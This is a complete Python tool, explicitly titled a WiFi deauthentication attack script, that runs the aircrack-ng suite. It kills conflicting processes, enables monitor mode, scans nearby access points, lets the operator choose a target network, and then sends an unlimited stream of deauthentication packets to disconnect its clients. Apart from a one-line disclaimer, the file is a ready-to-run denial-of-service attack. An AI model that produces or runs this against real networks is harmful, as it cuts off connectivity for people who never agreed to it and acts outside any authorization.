#!/usr/bin/env python3
# Enhanced WiFi Deauthentication Attack Script
# Disclaimer: For educational and authorized testing only

import sys
import subprocess
import re
import csv
import os
import time
import shutil
from datetime import datetime

# Color codes for terminal output
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'

active_wireless_networks = []
deauth_count = 0

def slowprint(s, speed=0.05):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(speed)

def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')

def display_banner():
    clear_screen()
    print(f"""{Colors.GREEN}
  [+]---------------------------------------------------------------------[+] 
   |   __      _____ ___ ___   ___  ___   ___  ___   _____         _       |
   |   \ \    / /_ _| __|_ _| |   \|   \ / _ \/ __| |_   _|__  ___| |      |
   |    \ \/\/ / | || _| | |  | |) | |) | (_) \__ \   | |/ _ \/ _ \ |__    |
   |     \_/\_/ |___|_| |___| |___/|___/ \___/|___/   |_|\___/\___/____|   |
   |                                                                       |
   |         {Colors.CYAN}github page : https://github.com/A-Rithy{Colors.GREEN}              |
  [+]---------------------------------------------------------------------[+]
{Colors.END}""")

def check_root():
    if not os.geteuid() == 0:
        slowprint(f"{Colors.RED}[!] This script must be run as root.{Colors.END}")
        sys.exit(1)

def backup_existing_files():
    csv_files = [f for f in os.listdir() if f.endswith('.csv')]
    if csv_files:
        slowprint(f"{Colors.YELLOW}[!] Found existing CSV files. Creating backup...{Colors.END}")
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        backup_dir = os.path.join(os.getcwd(), 'backup')
        os.makedirs(backup_dir, exist_ok=True)
        
        for file in csv_files:
            new_name = f"{timestamp}_{file}"
            shutil.move(file, os.path.join(backup_dir, new_name))
            slowprint(f"{Colors.BLUE}[+] Backed up: {file} -> {new_name}{Colors.END}")

def get_wireless_interfaces():
    try:
        iwconfig_output = subprocess.run(["iwconfig"], capture_output=True, text=True).stdout
        interfaces = re.findall(r"^(wlan\d+|wlx\w+)", iwconfig_output, re.MULTILINE)
        return interfaces
    except Exception as e:
        slowprint(f"{Colors.RED}[!] Error detecting wireless interfaces: {e}{Colors.END}")
        return []

def select_interface(interfaces):
    if not interfaces:
        slowprint(f"{Colors.RED}[!] No wireless interfaces found.{Colors.END}")
        sys.exit(1)
        
    slowprint(f"{Colors.GREEN}[+] Available wireless interfaces:{Colors.END}")
    for idx, iface in enumerate(interfaces):
        print(f"  {idx} - {iface}")
    
    while True:
        try:
            choice = int(input(f"{Colors.CYAN}[?] Select interface: {Colors.END}"))
            if 0 <= choice < len(interfaces):
                return interfaces[choice]
        except ValueError:
            slowprint(f"{Colors.RED}[!] Please enter a valid number.{Colors.END}")

def setup_monitor_mode(interface):
    try:
        # Kill conflicting processes
        slowprint(f"{Colors.YELLOW}[*] Killing conflicting processes...{Colors.END}")
        subprocess.run(["airmon-ng", "check", "kill"], check=True)
        
        # Enable monitor mode
        slowprint(f"{Colors.YELLOW}[*] Enabling monitor mode on {interface}...{Colors.END}")
        subprocess.run(["airmon-ng", "start", interface], check=True)
        
        monitor_iface = f"{interface}mon"
        slowprint(f"{Colors.GREEN}[+] Monitor mode enabled on {monitor_iface}{Colors.END}")
        return monitor_iface
    except subprocess.CalledProcessError as e:
        slowprint(f"{Colors.RED}[!] Failed to enable monitor mode: {e}{Colors.END}")
        sys.exit(1)

def scan_networks(monitor_iface):
    global active_wireless_networks
    
    csv_filename = f"scan_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
    
    try:
        slowprint(f"{Colors.YELLOW}[*] Starting network scan (Ctrl+C to stop)...{Colors.END}")
        scan_proc = subprocess.Popen(
            ["airodump-ng", "-w", csv_filename, "--output-format", "csv", monitor_iface],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        
        try:
            while True:
                clear_screen()
                update_network_list(csv_filename + ".csv")
                display_networks()
                time.sleep(1)
        except KeyboardInterrupt:
            scan_proc.terminate()
            slowprint(f"{Colors.GREEN}[+] Scan stopped.{Colors.END}")
            
    except Exception as e:
        slowprint(f"{Colors.RED}[!] Scan failed: {e}{Colors.END}")
        sys.exit(1)

def update_network_list(csv_file):
    global active_wireless_networks
    
    if not os.path.exists(csv_file):
        return
        
    fieldnames = [
        'BSSID', 'First_time_seen', 'Last_time_seen', 'channel', 
        'Speed', 'Privacy', 'Cipher', 'Authentication', 'Power', 
        'beacons', 'IV', 'LAN_IP', 'ID_length', 'ESSID', 'Key'
    ]
    
    try:
        with open(csv_file) as f:
            csv_reader = csv.DictReader(f, fieldnames=fieldnames)
            for row in csv_reader:
                if row["BSSID"] == "BSSID":
                    continue
                if row["BSSID"] == "Station MAC":
                    break
                if is_new_network(row["ESSID"], row["BSSID"]):
                    active_wireless_networks.append(row)
    except Exception as e:
        slowprint(f"{Colors.RED}[!] Error reading CSV: {e}{Colors.END}")

def is_new_network(essid, bssid):
    for network in active_wireless_networks:
        if network["ESSID"] == essid and network["BSSID"] == bssid:
            return False
    return True

def display_networks():
    print(f"{Colors.BLUE}[+] Discovered Networks (Ctrl+C to stop scan){Colors.END}\n")
    print(f"{Colors.WHITE}{'ID':<3} | {'BSSID':<17} | {'CH':<2} | {'PWR':<3} | {'ESSID':<20}{Colors.END}")
    print("-" * 60)
    
    for idx, network in enumerate(active_wireless_networks):
        essid = network["ESSID"] if network["ESSID"] else "[Hidden]"
        print(
            f"{Colors.YELLOW}{idx:<3}{Colors.END} | "
            f"{Colors.GREEN}{network['BSSID']:<17}{Colors.END} | "
            f"{Colors.CYAN}{network['channel'].strip():<2}{Colors.END} | "
            f"{Colors.PURPLE}{network['Power'].strip():<3}{Colors.END} | "
            f"{Colors.WHITE}{essid[:20]:<20}{Colors.END}"
        )

def select_target():
    if not active_wireless_networks:
        slowprint(f"{Colors.RED}[!] No networks found.{Colors.END}")
        sys.exit(1)
        
    while True:
        try:
            choice = input(f"{Colors.CYAN}[?] Select target network ID: {Colors.END}")
            idx = int(choice)
            if 0 <= idx < len(active_wireless_networks):
                return active_wireless_networks[idx]
        except ValueError:
            slowprint(f"{Colors.RED}[!] Invalid selection.{Colors.END}")

def deauth_attack(target, monitor_iface):
    global deauth_count
    
    bssid = target["BSSID"]
    channel = target["channel"].strip()
    
    try:
        # Set channel
        subprocess.run(["iwconfig", monitor_iface, "channel", channel], check=True)
        
        # Start deauth
        slowprint(f"{Colors.RED}[!] Starting deauthentication attack on {target['ESSID']} ({bssid}){Colors.END}")
        slowprint(f"{Colors.YELLOW}[!] Press Ctrl+C to stop the attack{Colors.END}")
        
        deauth_proc = subprocess.Popen(
            ["aireplay-ng", "--deauth", "0", "-a", bssid, monitor_iface],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        
        try:
            while True:
                deauth_count += 1
                print(f"{Colors.RED}[*] Deauth packets sent: {deauth_count}{Colors.END}", end='\r')
                time.sleep(0.5)
        except KeyboardInterrupt:
            deauth_proc.terminate()
            slowprint(f"\n{Colors.GREEN}[+] Attack stopped.{Colors.END}")
            
    except Exception as e:
        slowprint(f"{Colors.RED}[!] Attack failed: {e}{Colors.END}")

def cleanup(monitor_iface):
    try:
        slowprint(f"{Colors.YELLOW}[*] Cleaning up...{Colors.END}")
        subprocess.run(["airmon-ng", "stop", monitor_iface], check=True)
        slowprint(f"{Colors.GREEN}[+] Monitor mode disabled.{Colors.END}")
    except Exception as e:
        slowprint(f"{Colors.RED}[!] Cleanup failed: {e}{Colors.END}")

def main():
    display_banner()
    check_root()
    backup_existing_files()
    
    interfaces = get_wireless_interfaces()
    iface = select_interface(interfaces)
    monitor_iface = setup_monitor_mode(iface)
    
    try:
        scan_networks(monitor_iface)
        target = select_target()
        deauth_attack(target, monitor_iface)
    except KeyboardInterrupt:
        slowprint(f"{Colors.YELLOW}[!] Operation cancelled by user.{Colors.END}")
    finally:
        cleanup(monitor_iface)
        slowprint(f"{Colors.GREEN}[+] Script completed.{Colors.END}")

if __name__ == "__main__":
    main()